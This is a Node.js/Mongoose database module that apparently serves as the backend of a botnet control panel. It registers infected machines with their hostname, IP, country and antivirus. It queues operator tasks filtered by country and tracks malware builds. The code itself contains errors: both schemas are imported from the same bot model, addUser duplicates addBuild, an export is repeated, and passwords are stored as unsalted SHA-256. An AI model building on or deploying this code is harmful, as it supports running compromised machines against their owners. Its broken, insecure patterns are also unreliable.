const mongoose = require('mongoose');
const config = require('../config');
const crypto = require('crypto');
const user = require('./models/bot');
const bot = require('./models/bot');

mongoose.set('strictQuery', true);
mongoose.connect(config.dbUri);

const User = mongoose.model('User', user);
const Bot = mongoose.model('Bot', bot);

async function createUser(username, password) {
    const user = new User({
        username: username,
        password: crypto.createHash('sha256').update(password).digest('hex'),
        encryptedKey: crypto.randomBytes(32).toString('hex'),
        tasks: [],
        builds: []
    });

    await user.save();

    return user.id;
}

async function verifyLogin(username, password) {
    const possible = await User.find({ username: username, password: crypto.createHash('sha256').update(password).digest('hex') }).exec();
    if (possible.length == 0) {
        return null;
    }

    return possible[0];
}

async function changePassword(username, password) {
    await User.findOneAndUpdate({ username: username }, { password: crypto.createHash('sha256').update(password).digest('hex') }).exec();
}

async function addTask(username, goal, param, targeted, countries) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.tasks.push({
        goal: goal,
        param: param,
        date: Date.now(),
        targeted: targeted,
        completed: 0,
        countries: countries
    });

    await User.findOneAndUpdate({ username: username }, user);
}

async function addBuild(username, log, path) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.builds.push({
        date: Date.now(),
        log: log,
        path: path
    });

    await User.findOneAndUpdate({ username: username }, user);
}

async function addUser(username, log, path) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.builds.push({
        date: Date.now(),
        log: log,
        path: path
    });

    await User.findOneAndUpdate({ username: username }, user);
}

async function userExist(username) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return false;
    }

    return true;
}

async function addBot(ownerusername, hostname, ip, country, av) {
    const bot = new Bot({
        ownerusername: ownerusername,
        hostname: hostname,
        ip: ip,
        country: country,
        av: av,
        firstStart: Date.now(),
        lastPing: Date.now()
    });

    await bot.save();

    return bot.id;
}

async function getTasks(username) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    const user = possible[0];
    let tasks = [];
    for (const task in user.tasks) {
        tasks.push(user.tasks[task]);
    }

    return tasks;
}

async function getBuilds(username) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    const user = possible[0];
    let builds = [];
    for (const build in user.builds) {
        builds.push(user.builds[build]);
    }

    return builds;
}

async function getBots(username) {
    const possible = await Bot.find({ ownerusername: username }).exec();
    return possible;
}

module.exports = {
    createUser,
    verifyLogin,
    addTask,
    addBot,
    addUser,
    getBuilds,
    getTasks,
    getBots,
    userExist,
    getBots,
    addBuild,
    changePassword
}